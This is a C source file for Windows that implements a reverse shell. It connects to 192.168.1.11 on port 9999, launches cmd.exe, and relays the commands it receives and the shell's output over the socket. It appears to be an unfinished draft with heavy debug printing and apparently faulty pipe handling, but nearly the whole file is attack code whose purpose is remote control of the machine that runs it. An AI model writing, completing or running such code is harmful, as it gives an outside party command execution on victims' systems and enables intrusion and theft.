#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <tchar.h>

#define CMD_MAX 1024

void printAsOrd(char buf[], int len) {
    for (int i = 0; i < len; i++) {
        printf("%d ", (int)buf[i]);
    }
    printf("\n");
}

void sc() {
    WSADATA wsaData;
    int res;
    struct sockaddr_in home;
    SOCKET sock;
    STARTUPINFO cmdStartInfo;
    PROCESS_INFORMATION cmdProcInfo;
    char cmdIn[CMD_MAX];
    char cmdOut[CMD_MAX];
    DWORD cmdRead;
    DWORD cmdWrite;
    DWORD bytesWaiting;
    SECURITY_ATTRIBUTES cmdStdAttrs;
    BOOL success;
    HANDLE mainStdOut;
    HANDLE mainStdIn;

    // Init stuff
    ZeroMemory(&cmdStartInfo, sizeof(cmdStartInfo));
    ZeroMemory(&cmdProcInfo, sizeof(cmdProcInfo));

    cmdStdAttrs.nLength = sizeof(SECURITY_ATTRIBUTES);
    cmdStdAttrs.bInheritHandle = TRUE;
    cmdStdAttrs.lpSecurityDescriptor = NULL;

    // Setup addr
    home.sin_family = AF_INET;
    home.sin_port = htons(9999);
    home.sin_addr.s_addr = inet_addr("192.168.1.11");

    // Init winsock2 and connect
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    connect(sock, (SOCKADDR *)&home, sizeof(home));

    // Create a shell to push over the socket
    mainStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    mainStdIn = GetStdHandle(STD_INPUT_HANDLE);

    cmdStartInfo.cb = sizeof(cmdStartInfo);
    cmdStartInfo.hStdInput = mainStdIn;
    cmdStartInfo.hStdOutput = mainStdOut;
    cmdStartInfo.hStdError = mainStdOut;
    cmdStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    success = CreateProcess("C:\\windows\\system32\\cmd.exe",
            NULL,
            NULL,
            NULL,
            TRUE,
            0,
            NULL,
            NULL,
            &cmdStartInfo,
            &cmdProcInfo);

    if (!success) {
        printf("Failed to create child process\n");
    }

    // Read
    while (cmdRead = recv(sock, cmdIn, CMD_MAX, 0)) {
        success = WriteFile(mainStdIn, cmdIn, cmdRead, &cmdWrite, NULL);
        if (success) {
            printf("Reading response...\n");
            printf("About to read...\n");
            for (;;) {
                PeekNamedPipe(mainStdOut, cmdOut, CMD_MAX, &cmdRead, &bytesWaiting, NULL);
                printf("Found %d bytes waiting in pipe so I copied those into the buff.\n", bytesWaiting);
                success = WaitForSingleObject(mainStdOut, 2000);
                printf("Result of waiting was: %d\n", success);
                success = ReadFile(mainStdOut, cmdOut, CMD_MAX, &cmdRead, NULL);
                printf("Read %d bytes\n", cmdRead);
                printf("%s\n", cmdOut);
                printAsOrd(cmdOut, cmdRead);
                printf("Last error was: %d\n", GetLastError());
                if (success) {
                    // Send the message back over the socket
                    cmdWrite = send(sock, cmdOut, cmdRead, 0);
                    printf("Send %d bytes back over socket\n", cmdWrite);
                } else {
                    printf("Failed to read from pipe\n");
                }
            }
        }
    }

    //CloseHandle(cmdProcInfo.hProcess);
    //CloseHandle(cmdProcInfo.hThread);

    ZeroMemory(cmdIn, sizeof(cmdIn));
    ZeroMemory(cmdOut, sizeof(cmdOut));

    /*
    printf("Performing test write...\n");
    if (!WriteFile(cmdStdIn, "dir\n", 4, (LPDWORD)&cmdWrite, NULL)) {
        printf("Test write failed\n");
        printf("Error code: %d\n", GetLastError());
    }
    */

    // Close and cleanup
    res = closesocket(sock);
    WSACleanup();
}

int main(int argc, char *argv[]) {
    sc();
    return 0;
}
